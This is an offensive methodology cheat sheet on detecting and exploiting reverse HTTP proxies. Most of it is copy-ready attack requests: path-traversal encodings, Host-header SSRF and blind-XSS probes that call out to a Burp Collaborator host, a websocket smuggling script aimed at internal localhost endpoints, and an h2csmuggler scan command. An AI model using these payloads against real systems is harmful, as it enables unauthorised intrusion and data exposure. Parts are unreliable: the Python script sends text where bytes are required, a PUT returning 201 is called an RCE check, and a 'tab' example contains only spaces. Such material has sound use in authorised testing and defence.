# Identifying and Exploiting Reverse HTTP Proxies

## Author
Mahmoud M. Awali (@0xAwali)

## Techniques to Identify "Hidden" Reverse HTTP Proxies

### HTTP Request for Identification
```http
TRACE /Endpoint-To-Proxy HTTP/1.1
Host: www.company.com
Max-Forwards: 1
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

### Indicators of a Reverse Proxy
- **Status Codes**: 502 Bad Gateway, 483 (custom)
- **Response Body**: Presence of `X-Forwarded-For` in the body when using TRACE
- **Headers**:
  - `Via` or `X-Via`
  - Differences in `Server`, `Content-Type`, and `Via` headers between hops
  - Differences in HTML titles and `Address` tags
  - `X-Forwarded-For` values in the body

## Routing and Encoding Techniques

### Testing Endpoint Redirection
- Check if `/Endpoint-To-Proxy/../` returns different content or headers compared to `/`.
- Use URL encoding, double, or triple encoding in parameters:
  - `%23` for `#`
  - `%3F` for `?`
  - `%26` for `&`
  - `%2e` for `.`

### Example Encoded URLs
- `https://www.company.com/api/path?id=%23`
- `https://www.company.com/api/..%00/`

### Payloads for URL Injection
- `..%2f%23`
- `..;/`
- `..%00/`
- `..%0d/`
- `..%5c`
- `..\\`
- `..%ff/`
- `%2e%2e%2f`
- `.%2e/`

## Methodology for Further Exploration

### Using OPTIONS Method
- Use the OPTIONS method to discover sub-endpoints:
  ```http
  OPTIONS /Endpoint-To-Proxy/Another-Endpoint HTTP/1.1
  Host: www.company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```

### Checking for Remote Code Execution (RCE)
- Change the request method to PUT and look for a 201 Created response:
  ```http
  PUT /Endpoint-To-Proxy HTTP/1.1
  Host: www.company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```

### Retrieving Sensitive Information
- Append `.json` to endpoints to retrieve sensitive information:
  ```http
  GET /endpoint-To-Proxy.json HTTP/1.1
  Host: www.company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```

### Testing HTTP/2 Cleartext Support
- Use tools like `h2csmuggler` to test for HTTP/2 cleartext support:
  1. Collect all endpoints.
  2. Save them in a file, e.g., `url.txt`.
  3. Run the following command:
     ```sh
     python3 h2csmuggler.py --scan-list url.txt --threads 5
     ```

### Smuggling Websocket Endpoints
- Use a custom script to smuggle websocket requests:
  ```python
  import socket

  req1 = '''GET /Endpoint-To-Proxy/ HTTP/1.1
  Host: company.com
  Sec-WebSocket-Version: 1337
  Upgrade: websocket
  '''.replace('\n', '\r\n')

  req2 = '''GET /Internal-Endpoint HTTP/1.1
  Host: localhost:PORT
  '''.replace('\n', '\r\n')

  def main(netloc):
      host, port = netloc.split(':')
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((host, int(port)))
      sock.sendall(req1)
      sock.recv(4096)
      sock.sendall(req2)
      data = sock.recv(4096)
      data = data.decode(errors='ignore')
      print(data)
      sock.shutdown(socket.SHUT_RDWR)
      sock.close()
  ```

## Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF) Techniques

### Blind XSS via Nginx Reverse Proxy
- Inject blind XSS payloads:
  ```http
  GET /Endpoint-To-Proxy/%3C%22img src='https://RandomString(10).id.burpcollaborator.net'%22%3E HTTP/1.1
  Host: www.company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  Connection: keep-alive
  ```

### Injecting XSS Payloads
- Append `">` after endpoints:
  ```http
  GET /Endpoint-To-Proxy/"> HTTP/1.1
  Host: company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  Connection: keep-alive
  ```

### Manipulating Host Headers
- Inject a custom domain in the Host header:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  Host: RandomString(10).id.burpcollaborator.net
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  Connection: keep-alive
  ```
- Ambiguate the Host header:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  Host: company.com@RandomString(10).id.burpcollaborator.net
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  Connection: keep-alive
  ```

### SSRF via Host Header Manipulation
- Change the routing of the request:
  ```http
  GET /Endpoint-To-Proxy@RandomString(10).id.burpcollaborator.net# HTTP/1.1
  Host: company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  Connection: keep-alive
  ```

### Additional Host Header Manipulations
- Inject `localhost` in the Host header:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  Host: localhost
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```
- Add another space-surrounded Host header:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  Host: www.company.com
  Host: RandomString(10).id.burpcollaborator.net
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```

### Modifying the Host Header
- Change the case of the Host header:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  host: www.company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```
- Remove the space in the Host header:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  Host:www.company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```
- Add a tab instead of a space:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  Host:    www.company.com
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```

### Adding Special Characters to the Host Header
- Append special characters after the Host value:
  ```http
  GET /Endpoint-To-Proxy HTTP/1.1
  Host: www.company.com sensitive-file.txt
  User-Agent: Mozilla/5.0
  Referer: https://previous.com/path
  Origin: https://www.company.com
  ```

This document provides a comprehensive guide to identifying and exploiting reverse HTTP proxies, including techniques for testing endpoint redirection, injecting payloads, and manipulating headers.